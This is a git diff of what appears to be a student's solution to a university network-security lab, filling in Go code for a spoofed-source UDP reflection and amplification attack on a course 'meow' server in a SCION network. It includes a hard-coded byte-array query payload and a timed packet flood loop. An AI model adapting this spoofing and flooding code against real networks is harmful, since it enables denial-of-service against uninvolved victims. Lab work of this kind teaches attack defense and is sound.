@@ -17,6 +17,7 @@ import (
 
 	// "ethz.ch/netsec/isl/handout/attack/server"
 	"github.com/scionproto/scion/go/lib/addr"
+
 	// "github.com/scionproto/scion/go/lib/daemon"
 	"github.com/scionproto/scion/go/lib/sock/reliable"
 	// "github.com/scionproto/scion/go/lib/spath"
@@ -24,7 +25,8 @@ import (
 
 func GenerateAttackPayload() []byte {
 	// TODO: Amplification Task
-	return make([]byte, 0)
+	payload := []byte{123, 34, 72, 34, 58, 123, 34, 73, 100, 34, 58, 48, 44, 34, 70, 34, 58, 123, 34, 72, 34, 58, 34, 116, 34, 44, 34, 86, 34, 58, 34, 117, 34, 44, 34, 77, 34, 58, 34, 110, 34, 44, 34, 68, 34, 58, 34, 97, 34, 125, 125, 44, 34, 66, 34, 58, 123, 34, 81, 117, 101, 114, 121, 34, 58, 34, 54, 55, 53, 51, 52, 34, 125, 44, 32, 34, 116, 117, 110, 97, 34, 58, 32, 116, 114, 117, 101, 125}
+	return payload
 }
 
 func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAddr, payload []byte) (err error) {
@@ -65,16 +67,21 @@ func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAdd
 	// and spoof the return address to reflect to the victim.
 	// Don't forget to set the spoofed source port with your
 	// personalized port to get feedback from the victims.
-	payload = []byte{123, 34, 72, 34, 58, 123, 34, 73, 100, 34, 58, 48, 44, 34, 70, 34, 58, 123, 34, 72, 34, 58, 34, 116, 34, 44, 34, 86, 34, 58, 34, 117, 34, 44, 34, 77, 34, 58, 34, 110, 34, 44, 34, 68, 34, 58, 34, 97, 34, 125, 125, 44, 34, 66, 34, 58, 123, 34, 81, 117, 101, 114, 121, 34, 58, 34, 54, 55, 53, 51, 52, 34, 125, 44, 32, 34, 116, 117, 110, 97, 34, 58, 32, 116, 114, 117, 101, 125}
+	// payload = []byte{123, 34, 72, 34, 58, 123, 34, 73, 100, 34, 58, 48, 44, 34, 70, 34, 58, 123, 34, 72, 34, 58, 34, 116, 34, 44, 34, 86, 34, 58, 34, 117, 34, 44, 34, 77, 34, 58, 34, 110, 34, 44, 34, 68, 34, 58, 34, 97, 34, 125, 125, 44, 34, 66, 34, 58, 123, 34, 81, 117, 101, 114, 121, 34, 58, 34, 54, 55, 53, 51, 52, 34, 125, 44, 32, 34, 116, 117, 110, 97, 34, 58, 32, 116, 114, 117, 101, 125}
 	// ret, err := conn.Write(payload)
 	// fmt.Println(ret)
 	// fmt.Println(err)
-
-	for start := time.Now(); time.Since(start) < 10*1e9; {
+	payload = []byte{0}
+	fmt.Println(AttackDuration())
+	for start := time.Now(); time.Since(start) < AttackDuration(); {
 		conn.Write(payload)
 		// fmt.Println(ret)
 		// fmt.Println(err)
 
 	}
+	// conn.Write(payload)
+
+	// buffer := make([]byte, server.MaxBufferSize)
+	// nRead, _, err := conn.ReadVia(buffer)
 	return nil
 }
